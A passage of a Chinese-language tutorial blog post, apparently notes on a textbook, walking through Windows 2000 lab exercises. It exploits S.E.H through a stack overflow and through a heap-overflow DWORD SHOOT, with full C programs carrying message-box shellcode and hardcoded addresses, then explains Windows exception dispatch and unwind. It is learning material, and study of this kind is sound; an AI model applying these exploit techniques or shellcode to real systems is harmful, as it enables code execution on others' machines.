注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机与实体均可</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p>说明： Windows XP SP2 和 Windows 2003 中加入了对 S.E.H 的安全校验，因此会导致实验失败。</p></blockquote><h3 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h3><p><strong>第一步：确定 shellcode 的起始位置 和 S.E.H 回调句柄的偏移</strong></p><p>暂时将 shellcode 赋值为一段 <code>0x90</code>，运行代码，如下图所示，shellcode 的起始地址为<code>0x0012fe48</code><br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418111708935.png" alt="image-20220418111708935"></p><p>查看所有的 S.E.H 结构的位置和其注册的异常回调函数句柄，依次点击OllyDbg菜单中的 “查看” —&gt; “SEH链”<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112245646.png" alt="image-20220418112245646"><br>上图显示当前线程安装了 3 个S.E.H，当发生异常时，位于<code>0x0012ff68</code>处的 S.E.H 将第一个被调用</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418112754437.png" alt="image-20220418112754437"><br><code>0x0012ff1c</code>处的指针<code>0x004017f8</code>是我们需要修改的异常回调函数句柄。</p><p><strong>第二步：组织缓冲区</strong>，把<code>0x0012ff1c</code>处的回调句柄修改成 shellcode 的起始地址 <code>0x0012fe48</code></p><p>缓冲区起始地址 <code>0x0012fe48</code>与异常句柄 <code>0x0012ff1c</code>之间共有 212 个字节的间隙。</p><p>仍然用弹出 “failwest” 消息框的 shellcode 进行测试，将不足 212 字节的部分用 <code>0x90</code>补齐。缓冲区最后的 4 个字节，即 209~212字节使用 shellcode 的起始地址<code>0x0012fe48</code>填充，来覆盖异常回调函数的句柄；最后删去中断指令__asm int 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x48\xFE\x12\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;got an exception, press Enter to kill process!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span> * input)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">_try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf,input); <span class="comment">//overrun the stack</span></span><br><span class="line">zero=<span class="number">4</span>/zero; <span class="comment">//generate an exception</span></span><br><span class="line">&#125;</span><br><span class="line">_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下代码，弹出了 “failwest” 消息框，如下图，栈溢出成功<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418122923348.png" alt="实验结果failwest"></p><p>这时操作系统错误的使用 shellcode 去处理除零异常，从而使植入代码运行。</p><h2 id="在堆溢出中利用-seh"><a class="markdownIt-Anchor" href="#在堆溢出中利用-seh"></a> 在堆溢出中利用 S.E.H</h2><p>堆溢出发生往往同时伴随着异常产生，所以 S.E.H 通常也是堆溢出 DWORD SHOOT 的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block</span></span><br><span class="line"><span class="string">&quot;\x88\x06\x52\x00&quot;</span><span class="comment">//0x00520688 is the address of shellcode in first</span></span><br><span class="line"><span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line"><span class="comment">//512 !</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实验思路：</strong><br>（ 1）溢出第一个堆块的数据将写入后面的空闲堆块，在第二次堆分配时发生 DWORD SHOOT。<br>（ 2）将 S.E.H 的异常回调函数地址作为 DWORD SHOOT 的目标，将其替换为 shellcode 的入口地址，异常发生后，操作系统将错误地把 shellcode 当作异常处理函数而执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 2000 虚拟机和实体机均可。</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td></tr><tr><td>编译选项</td><td>默认编译选项</td></tr><tr><td>build 版本</td><td>release 版本 必须使用 release 版本进行调试</td></tr></tbody></table><blockquote><p><strong>说明：</strong><br>即使完全按照推荐的实验环境进行操作， S.E.H 中异常回调函数句柄的地址及 shellcode 的起始地址可能仍然需要在调试中重新确定。</p></blockquote><p><strong>第一步：找到 S.E.H 的位置 和 shellcode 的位置</strong></p><p>首先，我们把 DWORD SHOOT 最后 4 个字节的 target 设置为一个无效的内存地址，如<code>0x90909090</code>，让程序触发异常。我们所需要做的就是在程序运行时，找到 S.E.H 的位置，然后把 DWORD SHOOT 的 target 指向 S.E.H 的回调句柄。</p><p>在调试前应当确认 OllyDbg 能够捕捉所有的异常，方法是查看菜单“options”下的“debugging<br>option”中“ Exceptions”选项中没有忽略任何类型的异常，如下图所示</p><p><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418212828226.png" alt="image-20220418212828226"></p><p>然后编译运行代码，程序会自动中断，进入 OllyDbg。在寄存器 <code>EAX</code> 中，显示了HeapAlloc（）函数分配的堆的地址，即 shellcode 的起始位置，如下图所示，这里 EAX = 0x00360688<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418220922950.png" alt="image-20220418220922950"></p><p>跳过中断后，按 F9 继续运行，DWORD SHOOT 发生后，程序产生异常。OllyDbg 捕捉到异常后会自动中断，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214132858.png" alt="image-20220418214132858"></p><p>这时查看栈中 S.E.H 情况：View —&gt; SEH chain，如下图所示<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220418214323855.png" alt="image-20220418214323855"></p><p><strong>第二步：组织缓冲区</strong></p><p>发现离第一个 S.E.H 位于 <code>0x0012FEEC</code> 的地方，那么异常回调函数的句柄应该位于这个地址后 4 个字节的位置 <code>0x0012FEF0</code>。现在，将 DWORD SHOOT 的目标地址由 <code>0x90909090</code> 改为 <code>0x0012FEF0</code>，去掉程序中的中断指令，重新编译运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x16\x01\x1A\x00\x00\x10\x00\x00&quot;</span><span class="comment">// head of the ajacent free block </span></span><br><span class="line"><span class="string">&quot;\x88\x06\x36\x00&quot;</span><span class="comment">//0x00360688 is the address of shellcode in first</span></span><br><span class="line"><span class="comment">//Heapblock</span></span><br><span class="line"><span class="string">&quot;\xF0\xFE\x12\x00&quot;</span>;<span class="comment">//target of DWORD SHOOT</span></span><br><span class="line">DWORD <span class="title function_">MyExceptionhandler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">200</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(h1,shellcode,<span class="number">0x200</span>);<span class="comment">// over flow here, noticed 0x200 means</span></span><br><span class="line"><span class="comment">//512 !</span></span><br><span class="line">__asm <span class="type">int</span> <span class="number">3</span> <span class="comment">// uesd to break the process</span></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，在我在运行时，有问题，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419141859603.png" alt="image-20220419141859603"></p><p>这里执行了未知指令，也就是<code>F0:FE</code> ，查看内存可以发现，在地址<code>0x0036068C</code>处我们的 shellcode 已经被修改为了<code>F0 FE 12 00</code>。<br>这就是 DWORD SHOOT 后的 “指针反射” 现象，在双向链表拆除时第二次链表操作导致了 DWORD SHOOT。DWORD SHOOT 把目标地址 <code>0012FEFO</code> 写回 shellcode 起始位置偏移 4 个字节的地方 <code>0036068c</code>。</p><p>这里我们把 <code>F0 FE 12 00</code>修改为 <code>EB 02 12 00</code>（这里只要能够跳转后一条指令就行），使得 EIP 跳到了0x00360690处开始执行从而避免了指针反射造成的错误，如下图<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220419143637686.png" alt="image-20220419143637686"></p><h2 id="深入挖掘-windows-异常处理"><a class="markdownIt-Anchor" href="#深入挖掘-windows-异常处理"></a> 深入挖掘 Windows 异常处理</h2><p><strong>（1）不同级别的 S.E.H</strong></p><p>异常处理的最小作用域是线程，每个线程都有自己的 S.E.H 链表。</p><p>异常处理流程 ：线程 —&gt; 进程 —&gt; 系统 —&gt; 终止</p><ul><li>首先执行线程中距离栈顶最近的 S.E.H 的异常处理函数。</li><li>若失败，则依次尝试执行 S.E.H 链表中后续的异常处理函数。</li><li>若 S.E.H 链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理。</li><li>若仍然失败，系统默认的异常处理将被调用，其结果是显示错误对话框。</li></ul><p><strong>（2）线程的异常处理</strong></p><p>线程中异常处理的回调函数的<strong>参数</strong>和<strong>返回值</strong>（回调函数执行前，操作系统将断点信息压栈）：</p><ul><li><p>参数</p><ul><li><p><strong>pExcept</strong>：指向一个结构体 <strong>EXCEPTION_RECORD</strong>。该结构体包含了若干<br>与异常相关的信息，如异常的类型、异常发生的地址等。</p></li><li><p><strong>pFrame</strong>：指向栈帧中的 <strong>S.E.H</strong> 结构体。</p></li><li><p><strong>pContext</strong>：指向 <strong>Context</strong> 结构体。该结构体中包含了所有寄存器的状态。</p></li><li><p><strong>pDispatch</strong>：未知用途。</p></li></ul></li><li><p>返回值</p><ul><li><strong>0</strong> (ExceptionContinueExcetution)：代表<strong>异常处理成功</strong>，将返回原程序发生异常的地方，继续执行。</li><li><strong>1</strong> (ExceptinoContinueSearch)：代表<strong>异常处理失败</strong>，将顺着 S.E.H 链表搜索其它可用于异常处理的函数并尝试处理。</li></ul></li></ul><p>线程的异常处理中还有一个叫 <strong>unwind 操作</strong>。</p><p>unwind 定义：在异常发生时，系统会顺着 S.E.H链表搜索能处理异常的句柄；一旦找到，系统会把已经遍历过的异常处理函数再调用一遍，这个过程就是 unwind 操作，第二轮调用就是 unwind 调用。</p><p>unwind 目的：”通知“ 前面处理异常失败的 S.E.H 释放资源，之后这些 S.E.H 结构体将被从链表中拆除。进而避免进行多次异常处理。</p><p>unwind 操作确保了异常处理机制自身的完整性和正确性。下图是一个没有使用 unwind 操作而导致异常处理机制自身产生错误的例子。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421223548497.png" alt="image-20220421223548497"></p><p>异常处理函数第一轮调用，用来处理异常，第二轮的 unwind 调用时，释放资源。那么异常回调函数怎么直到自己是第几轮调用呢？</p><p>答案在回调函数的第一个参数 pExcept 所指向的 EXCEPTION_RECORD 结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">DWORD ExceptionCode;</span><br><span class="line">DWORD ExceptionFlags; <span class="comment">//异常标志位</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">PVOID ExceptionAddress;</span><br><span class="line">DWORD NumberParameters;</span><br><span class="line">DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>当 ExceptionCode = 0xC0000027(STATUS_UNWIND)，ExceptionFlags = 2(EH_UNWINDING) 时，对回调函数的调用就属于 unwind 调用。</p><p>unwind 操作通过 kernerl.32 中的一个导出函数 RtlUnwind 实现，实际上 kernel32.dll 会转而再去调用 ntdll.dll 中的同名函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">RtlUnwind</span><span class="params">(</span></span><br><span class="line"><span class="params">PVOID TargetFrame,</span></span><br><span class="line"><span class="params">PVOID TargetIp,</span></span><br><span class="line"><span class="params">PEXCEPTION_RECORD ExceptionRecord,</span></span><br><span class="line"><span class="params">PVOID ReturnValue</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>**补充：**在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。</p></blockquote><p><strong>（3）进程的异常处理</strong></p><p>进程的异常处理回调函数需要通过 API 函数 SetUnhandledExceptionFilter 来注册 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPTOP_LEVEL_EXCEPTION_FILTER <span class="title function_">SetUnhandledExceptionFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><blockquote><p><strong>提示：</strong> 您可以简单地把线程异常处理对应为代码中的__try{} __ except(){}或者 Assert等语句，把进程的异常处理对应于函数 SetUnhandledExceptionFilter。</p></blockquote><p>进程的异常处理函数的<strong>返回值</strong>：</p><ul><li><strong>1</strong>（ EXCEPTION_EXECUTE_HANDLER）：表示错误得到正确的处理，程序将退出。</li><li><strong>0</strong>（ EXCEPTION_CONTINUE_SEARCH）：无法处理错误，将错误转交给系统默认的异常处理。</li><li><strong>-1</strong>（ EXCEPTION_CONTINUE_EXECUTION）：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。</li></ul><p><strong>（4）系统默认的异常处理 U.E.F</strong></p><p>系统默认的异常处理函数 UnhandledExceptionFilter()，简称 【U.E.F】UnhandledExceptionFilter() 将首先检查注册表 HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\AeDebug 下的表项，如下图所示。<br><img src="/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/image-20220421231555943.png" alt="image-20220421231555943"></p><p>路径下的 <strong>Auto</strong> 表项代表<strong>是否弹出错误对话框</strong>，值为 1 表示不弹出错误对话框直接结束程序，其余值均会弹出提示错误的对话框。<br>注册表的 Debugger 指明了系统默认的调试器，在错误框弹出后，如果您选择调试，UnhandledExceptionFilter 就会按照这里的命令加载相应的调试器。</p><p><strong>（5）异常处理流程的总结</strong></p><p>windows 2000 异常处理的<strong>基本流程</strong>：</p><ul><li>CPU 执行时发生并捕获异常，内核接过进程的控制权，开始内核态的异常处理。</li><li>内核异常处理结束，将控制权还给 ring3。</li><li>ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher()函数。</li><li>KiUserExceptionDispatcher()首先<strong>检查</strong>程序是否处于<strong>调试状态</strong>。如果程序正在被调试，会将异常交给调试器进行处理。</li><li>在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException()函数<strong>对线程的 S.E.H 链表进行遍历</strong>，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li><li>如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用，即<strong>调用用户自定义进程异常处理函数</strong>。</li><li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么<strong>系统默认的异常处理 UnhandledExceptionFilter()将被调用</strong>。 U.E.F 